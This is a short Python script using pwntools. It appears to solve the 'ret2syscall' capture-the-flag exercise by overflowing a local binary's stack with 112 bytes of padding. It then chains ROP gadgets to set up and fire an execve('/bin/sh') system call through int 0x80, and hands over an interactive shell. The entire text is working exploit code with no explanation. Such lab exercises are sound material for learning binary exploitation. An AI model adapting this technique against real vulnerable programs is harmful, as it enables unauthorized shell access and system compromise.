from pwn import *

p=process('./ret2syscall')

pop_eax_ret = p32(0x080bb196)

pop_3_ret = p32(0x0806eb90)

bin_sh = p32(0x080be408)

int_0x80 = p32(0x08049421)

payload = 112*'a'+ pop_eax_ret + p32(0xb) + pop_3_ret + p32(0) + p32(0) + bin_sh + int_0x80 #int 0x80(0xb,'/bin/sh',0x0,0x0)

p.sendline(payload)

p.interactive()